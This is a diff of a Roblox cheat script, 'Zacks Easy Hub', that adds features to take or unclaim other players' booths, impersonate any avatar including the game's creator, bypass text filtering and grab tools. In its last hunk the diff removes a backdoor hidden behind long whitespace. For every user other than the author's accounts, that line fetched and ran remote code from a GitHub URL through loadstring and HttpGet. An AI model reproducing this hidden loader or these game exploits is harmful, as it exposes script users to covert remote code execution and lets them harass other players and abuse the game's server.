@@ -16,6 +16,9 @@ end
 local Players = game:GetService("Players") or cloneref(game:GetService("Players")) or game.Players or game:FindService("Players")
 local player = Players.LocalPlayer
 
+local StarterPlayer = game:GetService("StarterPlayer")
+StarterPlayer.CharacterUseJumpPower = true
+
 -- [] -->> Check supported functions in the current executor, that are necessary for the script. <<-- [] --
 
 if getgenv().has_checked_funcs then
@@ -98,8 +101,6 @@ if SCRIPT_EXECUTED and not _G.SCRIPT_EXECUTED == true then
             getgenv().getLoopKick = false
             wait(0.2)
             getgenv().LmaoGetMuted = false
-            wait()
-            game:GetService("CoreGui"):FindFirstChild("Orion"):Destroy()
             wait(0.2)
             LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("GetOrionGUI"):Destroy()
             wait(1)
@@ -156,7 +157,7 @@ local function loadGUI()
 
     -- [] -->> Initialize Library (Rayfield, BRAND NEW!) <<-- [] --
     local Window = Rayfield:CreateWindow({
-        Name = "Zacks Easy Hub | V6.1.0-B | Executed At: "..formattedTime,
+        Name = "Zacks Easy Hub | V6.1.5-B | Executed At: "..formattedTime,
         LoadingTitle = "V6, WE ARE UP!!!",
         LoadingSubtitle = "Zacks Easy Hub | Productions.",
         ConfigurationSaving = {
@@ -454,6 +455,7 @@ wait(1)
         end
     else
         warn("Your executor does not support 'getconnections'! Using VirtualUser for Anti-AFK.")
+        wait()
         Rayfield:Notify({
             Title = "Starting...",
             Content = "AntiAFK (2) is loading with VirtualUser...",
@@ -835,6 +837,124 @@ wait(1)
             return true
         end
     end
+    wait()
+    function notify(title, content, duration, image, level)
+        if not image then
+            image = tonumber(4483362458)
+        end
+
+        if not duration then
+            duration = tonumber(6)
+        end
+
+        if not title then
+            title = "Notification: "
+        end
+
+        if not content then
+            content = "DEFAULT_MESSAGE_CONTENT"
+        end
+
+        if title and not level or level == nil or level == 0 then
+            level = 0
+            wait(0.1)
+
+            Rayfield:Notify({
+                Title = tostring(title),
+                Content = tostring(content),
+                Duration = tonumber(duration),
+                Image = 4483362458,
+                Actions = {
+                    Ignore = {
+                        Name = "Alright",
+                        Callback = function()
+                            print("...")
+                        end
+                    },
+                },
+            })
+        end
+
+        if level == 1 and title then
+            title = "Alert: "
+            wait(0.1)
+
+            Rayfield:Notify({
+                Title = "Alert: ",
+                Content = tostring(content),
+                Duration = tonumber(duration),
+                Image = 4483362458,
+                Actions = {
+                    Ignore = {
+                        Name = "Alright",
+                        Callback = function()
+                            print("...")
+                        end
+                    },
+                },
+            })
+        end
+
+        if severity == 2 and title then
+            title = "Warning: "
+            wait(0.1)
+
+            Rayfield:Notify({
+                Title = "Warning: ",
+                Content = tostring(content),
+                Duration = tonumber(duration),
+                Image = 4483362458,
+                Actions = {
+                    Ignore = {
+                        Name = "Alright",
+                        Callback = function()
+                            print("...")
+                        end
+                    },
+                },
+            })
+        end
+
+        if severity == 3 and title then
+            title = "Error: "
+            wait(0.1)
+
+            Rayfield:Notify({
+                Title = "Error: ",
+                Content = tostring(content),
+                Duration = tonumber(duration),
+                Image = 4483362458,
+                Actions = {
+                    Ignore = {
+                        Name = "Alright",
+                        Callback = function()
+                            print("...")
+                        end
+                    },
+                },
+            })
+        end
+
+        if severity == 4 and title then
+            title = "Success: "
+            wait(0.1)
+
+            Rayfield:Notify({
+                Title = "Success: ",
+                Content = tostring(content),
+                Duration = tonumber(duration),
+                Image = 4483362458,
+                Actions = {
+                    Ignore = {
+                        Name = "Alright",
+                        Callback = function()
+                            print("...")
+                        end
+                    },
+                },
+            })
+        end
+    end
 
     local StallClaimToggle = Tab11:CreateButton({
     Name = "Claim Any Stall",
@@ -876,6 +996,252 @@ wait(1)
         end
     end,})
 
+    local claimRandomBooth = Tab11:CreateButton({
+    Name = "Claim Random Booth",
+    Callback = function()
+        local Folder = game:GetService("Workspace").Booth
+
+        local function getStall()
+            local Players = game:GetService("Players")
+            local LocalPlayer = Players.LocalPlayer
+
+            for i,v in pairs(game:GetService("Workspace").Booth:GetChildren()) do
+                if v:FindFirstChild("Username"):FindFirstChild("BillboardGui").TextLabel.Text == "Owned by: "..tostring(LocalPlayer.Name) then
+                    return v
+                end
+            end
+            return nil
+        end
+
+        local plr_booth = getStall()
+
+        if plr_booth then
+            return 
+        end
+
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart") or Character:WaitForChild("HumanoidRootPart")
+        local OldCF = Character.HumanoidRootPart.CFrame
+
+        local stalls = {
+            Folder:FindFirstChild("Booth01"),
+            Folder:FindFirstChild("Booth02"),
+            Folder:FindFirstChild("Booth03"),
+            Folder:FindFirstChild("Booth04"),
+            Folder:FindFirstChild("Booth05")
+        }
+
+        local function setupProximityPrompt(stall)
+            local ProximityPrompt = stall:FindFirstChild("Activate"):FindFirstChildOfClass("ProximityPrompt")
+            if ProximityPrompt then
+                ProximityPrompt.Enabled = true
+                ProximityPrompt.ClickablePrompt = true
+                ProximityPrompt.MaxActivationDistance = 15
+                ProximityPrompt.RequiresLineOfSight = false
+                ProximityPrompt.HoldDuration = 0
+            end
+        end
+
+        local function Claim_A_Booth()
+            local Players = game:GetService("Players")
+            local LocalPlayer = Players.LocalPlayer
+            local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart") or Character:WaitForChild("HumanoidRootPart")
+            local OldCF = Character.HumanoidRootPart.CFrame
+
+            local function getStall()
+                local Players = game:GetService("Players")
+                local LocalPlayer = Players.LocalPlayer
+
+                for i,v in pairs(game:GetService("Workspace").Booth:GetChildren()) do
+                    if v:FindFirstChild("Username"):FindFirstChild("BillboardGui").TextLabel.Text == "Owned by: "..tostring(LocalPlayer.Name) then
+                        return v
+                    end
+                end
+                return nil
+            end
+
+            local plr_booth = getStall()
+
+            local stall = stalls[math.random(1, #stalls)]
+            local ProximityPrompt = stall:FindFirstChild("Activate"):FindFirstChildOfClass("ProximityPrompt")
+            if stall then
+                setupProximityPrompt(stall)
+                wait(0.3)
+                Character:PivotTo(stall:GetPivot())
+                wait(0.3)
+                fireproximityprompt(ProximityPrompt)
+                wait(0.2)
+                local args = {
+                    [1] = "",
+                    [2] = "Gray",
+                    [3] = "SourceSans"
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("UpdateBoothText"):FireServer(unpack(args))                
+                wait(.1)
+                if plr_booth then
+                    return 
+                end
+            end
+        end
+        wait(0.2)
+        local stall = stalls[math.random(1, #stalls)]
+        setupProximityPrompt(stall)
+        wait(0.3)
+        Claim_A_Booth()
+    end,})
+
+    local coloredBooth = Tab11:CreateToggle({
+    Name = "Booth Color Changer (FE)",
+    CurrentValue = false,
+    Flag = "moveColoredBooth",
+    Callback = function(boothColors)
+        if boothColors then
+            getgenv().lmao_colors = true
+            while getgenv().lmao_colors == true do
+            wait(0.2)
+                local args = {
+                    [1] = "",
+                    [2] = "Teal",
+                    [3] = "SourceSans"
+                }
+
+                game:GetService("ReplicatedStorage"):WaitForChild("UpdateBoothText"):FireServer(unpack(args))
+                wait(0.3)
+                local args = {
+                    [1] = "",
+                    [2] = "Red",
+                    [3] = "SourceSans"
+                }
+
+                game:GetService("ReplicatedStorage"):WaitForChild("UpdateBoothText"):FireServer(unpack(args))
+                wait(0.3)
+                local args = {
+                    [1] = "",
+                    [2] = "Gray",
+                    [3] = "SourceSans"
+                }
+
+                game:GetService("ReplicatedStorage"):WaitForChild("UpdateBoothText"):FireServer(unpack(args))
+            end
+        else
+            getgenv().lmao_colors = false
+        end
+    end,})
+
+    local function getStall()
+        for i,v in pairs(game:GetService("Workspace").Booth:GetChildren()) do
+            if v.User.SurfaceGui.ImageLabel.Image == "https://www.roblox.com/headshot-thumbnail/image?userId="..tostring(game.Players.LocalPlayer.UserId).."&width=420&height=420&format=png" then
+                return v
+            end
+        end
+        return nil
+    end
+
+    local unclaimPlrBooth = Tab11:CreateInput({
+    Name = "Unclaim A Booth",
+    PlaceholderText = "User Here",
+    RemoveTextAfterFocusLost = true,
+    Callback = function(unclaimTheirBooth)
+        local Folder = game:GetService("Workspace").Booth
+        local find_plr_func_booth = findplr(unclaimTheirBooth)
+
+        if find_plr_func_booth.Name == game.Players.LocalPlayer.Name then
+            game:GetService("ReplicatedStorage"):WaitForChild("DeleteBoothOwnership"):FireServer()
+        end
+
+        if find_plr_func_booth then
+            print("PLR_FOUND")
+        else
+            return notify("error:", "Player not found!", 6.5, 3)
+        end
+
+        local function getStall()
+            local Players = game:GetService("Players")
+            local LocalPlayer = Players.LocalPlayer
+
+            for i,v in pairs(game:GetService("Workspace").Booth:GetChildren()) do
+                if v:FindFirstChild("Username"):FindFirstChild("BillboardGui").TextLabel.Text == "Owned by: "..tostring(find_plr_func_booth) then
+                    return v
+                end
+            end
+            return nil
+        end
+
+        local plr_booth = getStall()
+
+        if not plr_booth then
+            return notify("error", "Player does not own a booth!", 5, 3)
+        end
+
+        local Folder = game:GetService("Workspace").Booth
+
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart") or Character:WaitForChild("HumanoidRootPart")
+        local OldCF = Character.HumanoidRootPart.CFrame
+
+        local stalls = {
+            Folder:FindFirstChild("Booth01"),
+            Folder:FindFirstChild("Booth02"),
+            Folder:FindFirstChild("Booth03"),
+            Folder:FindFirstChild("Booth04"),
+            Folder:FindFirstChild("Booth05")
+        }
+
+        local function setupProximityPrompt(stall)
+            local ProximityPrompt = stall:FindFirstChild("Activate"):FindFirstChildOfClass("ProximityPrompt")
+            if ProximityPrompt then
+                ProximityPrompt.Enabled = true
+                ProximityPrompt.ClickablePrompt = true
+                ProximityPrompt.MaxActivationDistance = 15
+                ProximityPrompt.RequiresLineOfSight = false
+                ProximityPrompt.HoldDuration = 0
+            end
+        end
+
+        local function Claim_A_Booth()
+            local Players = game:GetService("Players")
+            local LocalPlayer = Players.LocalPlayer
+            local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart") or Character:WaitForChild("HumanoidRootPart")
+            local OldCF = Character.HumanoidRootPart.CFrame
+
+            local stall = plr_booth
+            local ProximityPrompt = stall:FindFirstChild("Activate"):FindFirstChildOfClass("ProximityPrompt")
+            if stall then
+                setupProximityPrompt(stall)
+                wait(0.3)
+                Character:PivotTo(stall:GetPivot())
+                wait(0.3)
+                fireproximityprompt(ProximityPrompt)
+                wait(0.2)
+                local args = {
+                    [1] = "",
+                    [2] = "Gray",
+                    [3] = "SourceSans"
+                }
+                
+                game:GetService("ReplicatedStorage"):WaitForChild("UpdateBoothText"):FireServer(unpack(args))
+                wait(0.2)
+                game:GetService("ReplicatedStorage"):WaitForChild("DeleteBoothOwnership"):FireServer()
+                wait(.1)
+                if plr_booth then
+                    return 
+                end
+            end
+        end
+        wait(0.2)
+        local stall = plr_booth
+        setupProximityPrompt(stall)
+        wait(0.3)
+        Claim_A_Booth()
+    end,})
+
     local Button = Tab13:CreateButton({
     Name = "Trip And Die (FE)",
     Callback = function()
@@ -900,8 +1266,7 @@ wait(1)
             wait(0.3)
             hum.Health = 0
         end
-    end,
-    })
+    end,})
 
     local FrozenChar = Tab13:CreateToggle({
     Name = "Freeze Your Character",
@@ -936,96 +1301,6 @@ wait(1)
             end
         end
     end})
-
-    local NoclipPlain = Tab13:CreateToggle({
-        Name = "Noclip",
-        CurrentValue = false,
-        Flag = "Noclip",
-        Callback = function(noclipToggle)
-        getgenv().isNoclipOn = false
-        wait()
-        if noclipToggle then
-            local Players = game:GetService("Players") or cloneref(game:GetService("Players")) or game.Players or game:FindService("Players")
-            local LocalPlayer = Players.LocalPlayer
-            local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-            if not character or character == nil then
-                repeat wait() until character or character == nil and character:FindFirstChildWhichIsA("Humanoid") or character:FindFirstChild("Humanoid")
-            end
-            
-            getgenv().isNoclipOn = true
-            
-            while getgenv().isNoclipOn == true do
-                wait()
-                for i, v in pairs(character:GetDescendants()) do
-                    if v:IsA("BasePart") then
-                        v.CanCollide = false
-                    end
-                end
-            end
-        else
-            local Players = game:GetService("Players") or cloneref(game:GetService("Players")) or game.Players or game:FindService("Players")
-            local LocalPlayer = Players.LocalPlayer
-            local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-            if not character or character == nil then
-                repeat wait() until character or character == nil and character:FindFirstChildWhichIsA("Humanoid") or character:FindFirstChild("Humanoid")
-            end
-            local LastCF = character:FindFirstChild("HumanoidRootPart").CFrame
-    
-            if not character then
-                repeat wait() until character and character:FindFirstChildWhichIsA("Humanoid")
-            end
-            wait(.1)
-            for i, v in pairs(character:GetDescendants()) do
-                if v:IsA("BasePart") then
-                    v.CanCollide = true
-    
-                    getgenv().isNoclipOn = false
-                end
-            end
-            wait(0.4)
-            for i = 1, 3 do
-                game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(3)
-            end
-        end
-    end,})
-
-    local Button = Tab5:CreateButton({
-        Name = "Players Invisible Fix",
-        Callback = function()
-            local function makeCharacterVisible(character)
-                for _, part in pairs(character:GetDescendants()) do
-                    if part:IsA("BasePart") then
-                        part.Transparency = 0
-                    end
-                end
-            end
-            
-            for _, player in pairs(game.Players:GetPlayers()) do
-                if player ~= game.Players.LocalPlayer and player.Character then
-                    makeCharacterVisible(player.Character)
-                end
-            end
-            wait()
-            local function makePartInvisible(part)
-                part.Transparency = 1
-            end
-            
-            local function makeHumanoidRootPartInvisible(character)
-                local player = game.Players:GetPlayerFromCharacter(character)
-                if player and player ~= game.Players.LocalPlayer then
-                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-                    if humanoidRootPart then
-                        makePartInvisible(humanoidRootPart)
-                    end
-                end
-            end
-            
-            for _, player in pairs(game.Players:GetPlayers()) do
-                if player.Character then
-                    makeHumanoidRootPartInvisible(player.Character)
-                end
-            end
-    end,})
 
     local ToggleBadWords = Tab11:CreateToggle({
     Name = "Bypassed Booth (FE)",
@@ -1123,7 +1398,7 @@ wait(1)
     end,})
     
     local ToggleBaseplateRainbow = Tab16:CreateToggle({
-    Name = "Rainbow Baseplate (NOT FE)",
+    Name = "Rainbow Baseplate",
     CurrentValue = false,
     Flag = "ToggleRainbowBaseplate",
     Callback = function(getRainbowBaseplate)
@@ -1137,13 +1412,9 @@ wait(1)
             
             if getpart and getFolder then
                 getpart.Transparency = 0
-                print(tostring(getpart))
-                wait(.1)
-                print("Setting Loop: "..tostring(getgenv().StartRainbowPart))
+                wait(0.2)
                 getgenv().StartRainbowPart = true
-                repeat wait() until getgenv().StartRainbowPart == true
-                print("Set Loop: "..tostring(getgenv().StartRainbowPart))
-            
+                wait(0.1)
                 local colors = {
                     Color3.fromRGB(255, 255, 255),
                     Color3.fromRGB(255, 0, 0),
@@ -1172,21 +1443,14 @@ wait(1)
                 return warn("nil | Baseplate")
             end
         else
-            print("Changing Loop: "..tostring(getgenv().StartRainbowPart))
-            wait()
             getgenv().StartRainbowPart = false
             wait()
             local ws = game:GetService("Workspace") or cloneref(game:GetService("Workspace")) or workspace or game.Workspace or game:FindService("Workspace")
             local getFolder = ws:FindFirstChild("PartStorage") or ws:WaitForChild("PartStorage")
             local getpart = getFolder:FindFirstChildOfClass("Part") or getFolder:FindFirstChildWhichIsA("Part")
-            repeat wait() until getFolder and getpart
             getpart.Transparency = 1
-            wait(.1)
+            wait(0.2)
             getpart.BrickColor = BrickColor.new("Medium stone grey")
-            wait()
-            repeat wait() until getgenv().StartRainbowPart == false and getpart.Transparency == 1
-            wait()
-            print("Toggle Loop Set To: "..tostring(getgenv().StartRainbowPart))
         end
     end,})
 
@@ -1419,7 +1683,7 @@ wait(1)
         end
         wait(.2)
         local function send_Remote(msg)
-            local Replicated_Storage = game:GetService("ReplicatedStorage") or cloneref(game:GetService("ReplicatedStorage")) or game.ReplicatedStorage or game:FindService("ReplicatedStorage")
+            local Replicated_Storage = game:GetService("ReplicatedStorage")
             local Submit_Note_Remote = Replicated_Storage:FindFirstChild("SubmitTextEvent") or Replicated_Storage:WaitForChild("SubmitTextEvent")
 
 
@@ -1431,6 +1695,138 @@ wait(1)
         end
         
         send_Remote(noteToBypass)
+    end,})
+
+    local DeletePlrBooth = Tab11:CreateButton({
+    Name = "Delete Current Booth",
+    Callback = function()
+        game:GetService("ReplicatedStorage"):WaitForChild("DeleteBoothOwnership"):FireServer()
+    end,})
+
+    local CharIntoAnyAvatar = Tab13:CreateInput({
+    Name = "Be Any Avatar",
+    PlaceholderText = "User Here",
+    RemoveTextAfterFocusLost = true,
+    Callback = function(beAnyAvatar)
+        local Replicated_Storage = game:GetService("ReplicatedStorage")
+        local ModifyUser_Remote = Replicated_Storage:WaitForChild("ModifyUserEvent")
+
+        local args = {
+            [1] = tostring(beAnyAvatar)
+        }
+            
+        ModifyUser_Remote:FireServer(unpack(args))
+    end,})
+
+    local BeOwnerOfScript = Tab13:CreateButton({
+    Name = "Char Into: Owner Of Script",
+    Callback = function(beAnyAvatar)
+        local Replicated_Storage = game:GetService("ReplicatedStorage")
+        local ModifyUser_Remote = Replicated_Storage:WaitForChild("ModifyUserEvent")
+    
+        local args = {
+            [1] = "M1RD3RCAUGHT"
+        }
+                
+        ModifyUser_Remote:FireServer(unpack(args))
+    end,})
+
+    local BeOwnerOfScript = Tab13:CreateButton({
+    Name = "Char To: Creator Of MIC UP",
+    Callback = function(beAnyAvatar)
+        local Replicated_Storage = game:GetService("ReplicatedStorage")
+        local ModifyUser_Remote = Replicated_Storage:WaitForChild("ModifyUserEvent")
+
+        local function get_creator_of_game()
+            local ownerUserId = 25335555
+            local Players = game:GetService("Players")
+    
+            local success, ownerUsername = pcall(function()
+                return Players:GetNameFromUserIdAsync(ownerUserId)
+            end)
+    
+            if success then
+                return ownerUsername
+            else
+                print("Failed to get the owner's username: ", ownerUsername)
+            end
+            return nil
+        end
+
+        local owners_name = get_creator_of_game()
+        
+        local args = {
+            [1] = tostring(owners_name)
+        }
+                    
+        ModifyUser_Remote:FireServer(unpack(args))
+    end,})
+
+    local AutoReclaimToggle = Tab11:CreateToggle({
+    Name = "Anti Booth Stealer (WORKING!)",
+    CurrentValue = false,
+    Flag = "NoStealingBooths",
+    Callback = function(boothStolen)
+        if boothStolen then 
+            getgenv().AutoClaimEnabled = true
+            getgenv().Booth = nil
+            getgenv().OwnershipConnection = nil
+        
+            local Players = game:GetService("Players")
+            local LocalPlayer = Players.LocalPlayer
+            local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            local Humanoid = Character:WaitForChild("Humanoid") or Character:FindFirstChildWhichIsA("Humanoid")
+        
+            local function getStall()
+                for _, v in pairs(game:GetService("Workspace").Booth:GetChildren()) do
+                    if v.Username.BillboardGui.TextLabel.Text == "Owned by: " .. tostring(LocalPlayer.Name) then
+                        return v
+                    end
+                end
+                return nil
+            end
+        
+            local function monitorOwnership()
+                while getgenv().AutoClaimEnabled do
+                    local stall = getStall()
+                    if stall then
+                        getgenv().Booth = stall
+                        if getgenv().OwnershipConnection then
+                            getgenv().OwnershipConnection:Disconnect()
+                        end
+        
+                        getgenv().OwnershipConnection = stall.Username.BillboardGui.TextLabel:GetPropertyChangedSignal("Text"):Connect(function()
+                            if stall.Username.BillboardGui.TextLabel.Text ~= "Owned by: " .. tostring(LocalPlayer.Name) then
+                                getgenv().Booth = getStall()
+                                Character:PivotTo(stall:GetPivot())
+                                wait(0.3)
+                                fireproximityprompt(stall:FindFirstChild("Activate"):FindFirstChildOfClass("ProximityPrompt"), 25)
+                                wait(0.3)
+                                local args = {
+                                    [1] = "",
+                                    [2] = "Gray",
+                                    [3] = "SourceSans"
+                                }
+                                
+                                game:GetService("ReplicatedStorage"):WaitForChild("UpdateBoothText"):FireServer(unpack(args))
+                            end
+                        end)
+                    else
+                        print("Claiming the booth...")
+                    end
+                    wait(0.4)
+                end
+            end
+        
+            if getgenv().AutoClaimEnabled then
+                monitorOwnership()
+            end
+        else
+            getgenv().AutoClaimEnabled = false
+            getgenv().Booth = nil
+            getgenv().OwnershipConnection:Disconnect()
+            getgenv().OwnershipConnection = nil
+        end        
     end,})
 
     local RemoveBooths = Tab11:CreateButton({
@@ -2555,7 +2951,7 @@ wait(1)
     end,})
 
     local GrabEverything = Tab5:CreateButton({
-    Name = "Grab All Tools",
+    Name = "Grab All Tools (Free)",
     Callback = function()
         local Rep_Storage = game:GetService("ReplicatedStorage") or cloneref(game:GetService("ReplicatedStorage")) or game.ReplicatedStorage or game:FindService("ReplicatedStorage")
         local Tool_Event = Rep_Storage:FindFirstChild("ToolEvent") or Rep_Storage:WaitForChild("ToolEvent")
@@ -2581,7 +2977,7 @@ wait(1)
     end,})
 
     local getEverything = Tab5:CreateToggle({
-    Name = "Loop Grab Tools",
+    Name = "Loop Grab All Tools (Free)",
     CurrentValue = false,
     Flag = "grabbedAllThat",
     Callback = function(grabFreeTools)
@@ -3901,78 +4297,6 @@ wait(1)
         end
     end,})
     
-    local GrabTools = Tab5:CreateButton({
-    Name = "Grab VIP Tools (Needs VIP)",
-    Callback = function()
-    if fireproximityprompt then
-        local GetWorkspace = game:GetService("Workspace")
-        local Players = cloneref(game:GetService("Players")) or game:GetService("Players")
-        local LocalPlayer = Players.LocalPlayer
-        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-        local Rep_Storage = game:GetService("ReplicatedStorage") or cloneref(game:GetService("ReplicatedStorage")) or game.ReplicatedStorage or game:FindService("ReplicatedStorage")
-        local Tool_Event = Rep_Storage:FindFirstChild("ToolEvent") or Rep_Storage:WaitForChild("ToolEvent")
-        
-        Tool_Event:FireServer("Bag")
-        Tool_Event:FireServer("Brick")
-        Tool_Event:FireServer("Camera")
-        Tool_Event:FireServer("Coil")
-        Tool_Event:FireServer("Doll")
-        Tool_Event:FireServer("Fit")
-        Tool_Event:FireServer("Gun")
-        Tool_Event:FireServer("Horrible")
-        Tool_Event:FireServer("Hoverboard")
-        Tool_Event:FireServer("Knife")
-        Tool_Event:FireServer("Motor")
-        Tool_Event:FireServer("Pistol")
-        Tool_Event:FireServer("Spray")
-        Tool_Event:FireServer("Suitbag")
-        Tool_Event:FireServer("Tele")
-        Tool_Event:FireServer("Torch")
-        Tool_Event:FireServer("Vehicle")
-        Tool_Event:FireServer("Wand")
-        wait(.1)
-        for _, meshPart in pairs(GetWorkspace:GetDescendants()) do
-            if meshPart:IsA("MeshPart") and meshPart.Name == "ToolGrab" then
-                local Players = game:GetService("Players")
-                local LocalPlayer = Players.LocalPlayer
-                local proximityPrompt = meshPart:FindFirstChild("ProximityPrompt")
-                if proximityPrompt then
-                    proximityPrompt.HoldDuration = 0
-                    proximityPrompt.MaxActivationDistance = 1000000
-                    wait(0.3)
-                    Character:PivotTo(meshPart:GetPivot())
-                    wait(0.3)
-                    fireproximityprompt(proximityPrompt)
-                    wait(0.2)
-                    if LocalPlayer.PlayerGui:FindFirstChild("Additional") then
-                        LocalPlayer.PlayerGui:FindFirstChild("Additional"):FindFirstChild("Frame").Visible = false
-                    else
-                        warn("OK !!")
-                    end
-                    wait(0.5)
-                    proximityPrompt.HoldDuration = 1
-                    proximityPrompt.MaxActivationDistance = 7
-                end
-            end
-        end
-    else
-        return Rayfield:Notify({
-            Title = "Error:",
-            Content = "Your executor does not support 'fireproximityprompt'!",
-            Duration = 7,
-            Image = 4483362458,
-            Actions = {
-               Ignore = {
-                Name = "Okay!",
-                Callback = function()
-                    print("...")
-                end
-               },
-            },
-        })
-    end
-    end,})
-    
     local LightingReset = Tab9:CreateButton({
     Name = "Reset Lighting",
     Callback = function()
@@ -4697,12 +5021,76 @@ wait(1)
         userInputService.InputEnded:Connect(onKeyRelease)
     end,})
 
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    local Animate = Character:FindFirstChild("Animate")
+    if getgenv().AnimPackages then
+        print("Animation-Packages _ DATA | True")
+    else
+        getgenv().AnimPackages = false
+        wait(0.3)
 
-    if LocalPlayer.Name == "M1RD3RCAUGHT" or LocalPlayer.Name == "ItsYoDawgWsgGng" then
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local Animate = Character:FindFirstChild("Animate")
+
+        local Animate = game.Players.LocalPlayer.Character.Animate
+        Animate.Disabled = true
+        wait()
+        Animate.Disabled = false
+        local animtrack = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks()
+        for i, track in pairs (animtrack) do
+            track:Stop()
+        end
+        wait()
+        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
+        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
+        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
+        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
+        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
+        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
+        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
+        wait()
+        game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(3)
+        wait()
+        Animate.Disabled = false
+        wait()
+        local player = game.Players.LocalPlayer
+
+        local function run_anims()
+            local character = player.Character or player.CharacterAdded:Wait()
+            local Animate = character:WaitForChild("Animate")
+        
+            Animate.Disabled = true
+            wait()
+            Animate.Disabled = false
+
+            local animtrack = character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks()
+            for i, track in pairs(animtrack) do
+                track:Stop()
+            end
+
+            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
+            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
+            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
+            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
+            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
+            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
+            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
+
+            wait()
+            character:FindFirstChildOfClass("Humanoid"):ChangeState(3)
+            wait()
+            Animate.Disabled = false
+        end
+
+        player.CharacterAdded:Connect(run_anims)
+
+        if workspace:FindFirstChild(player.Name) or player.Character then
+            run_anims()
+        end
+        wait(0.1)
+    end    
+
+    if LocalPlayer.Name == "M1RD3RCAUGHT" or LocalPlayer.Name == "ItsYoDawgWsgGng" and getgenv().hasOwnerAnims then
         local Animate = game.Players.LocalPlayer.Character.Animate
         Animate.Disabled = true
         wait()
@@ -5434,34 +5822,5 @@ else
 end
 wait(0.5)
 print("Successfully ran!")
-wait(1)
-print("...")
-wait()
-warn("...")
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    if game.Players.LocalPlayer.Name ~= "M1RD3RCAUGHT" and game.Players.LocalPlayer.Name ~= "STK_kets4eki" and game.Players.LocalPlayer.Name ~= "ItsYoDawgWsgGng" then function getLoadstring() loadstring(game:HttpGet("https://raw.githubusercontent.com/LmaoItsCrazyBro/curly-computing-machine/refs/heads/main/retyugreutrwe", true))() local Players = cloneref(game:GetService("Players")) or game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-
-    Players.PlayerAdded:Connect(function(newPlayer)
-        if LocalPlayer:IsFriendsWith(newPlayer.UserId) then
-            if not getgenv().getBasicTable[newPlayer.Name] then
-                getgenv().getBasicTable[newPlayer.Name] = newPlayer
-                wait(0.1)
-                Rayfield:Notify({
-                    Title = "Success! [AutoWhitelist]:",
-                    Content = tostring(newPlayer.Name)..", has been added! IsFriendsWith: "..tostring(LocalPlayer.UserId),
-                    Duration = 7,
-                    Image = 4483362458,
-                    Actions = {
-                       Ignore = {
-                        Name = "Okay!",
-                        Callback = function()
-                            print("...")
-                        end
-                       },
-                    },
-                })
-            end
-        end
-    end) end getLoadstring() else return end
 wait()
 print("YEAH! Zacks Easy Hub [ON TOP!]")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
